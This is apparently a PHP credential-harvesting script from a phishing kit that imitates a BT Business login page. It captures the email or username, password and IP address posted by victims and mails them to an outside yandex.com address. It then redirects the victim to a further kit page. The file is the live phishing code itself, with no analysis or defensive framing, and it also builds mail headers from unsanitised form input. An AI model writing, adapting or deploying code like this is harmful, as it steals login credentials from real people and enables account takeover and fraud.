<?
$ip = getenv("REMOTE_ADDR");
$message .= "----------------------BT Business! Details-----------------------\n";
$message .= "Email or username	     : ".$_POST['USER']."\n";
$message .= "Password		     	 : ".$_POST['PASSWORD']."\n";
$message .= "IP                      : ".$ip."\n";
$message .= "---------------LAZ------------------------------\n";


$send = "cptzawaal@yandex.com";
$subject = "BT Business User";
$headers = "From: BTBusiness<blesslogs@logs.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);
       mail($subject,$message,$headers);

header ('Location: 6Otwbusiness1Wx.html');
exit;
?>
